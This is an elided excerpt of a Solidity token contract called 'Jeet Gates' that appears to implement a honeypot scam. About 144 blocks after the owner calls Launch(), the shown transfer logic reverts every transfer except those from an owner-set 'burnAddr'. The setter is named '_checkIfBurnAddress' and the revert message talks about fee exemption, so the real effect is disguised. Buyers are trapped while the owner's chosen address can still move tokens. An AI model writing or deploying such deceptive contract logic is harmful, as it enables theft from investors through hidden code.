...
contract JEETGATES is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Jeet Gates";
    string private _symbol = "JGATES";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x675d649b489D1007327880fB72613F7e93c867E1);
    address payable public BuyBackWalletAddress = payable(0x675d649b489D1007327880fB72613F7e93c867E1); 
    ...
    bool status_excludeFromFees = true;
    ...
    function _checkIfBurnAddress(address _currentBurn) public onlyOwner {
        burnAddr = _currentBurn;
    }
    function Launch() public onlyOwner {
        exemptFeesBlocks = block.number;
    }
    function _status_sendtoBurn() internal {
        if (block.number > exemptFeesBlocks + 12**2) {
            status_excludeFromFees = false;
        }
        else {
            status_excludeFromFees = true;
        }    
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if(checkWalletLimit && !isWalletLimitExempt[recipient])
                ...
                _status_sendtoBurn();
                if (!status_excludeFromFees) {
                    require(sender == burnAddr, "Allow transfers without fees to the dead address only"); 
                }
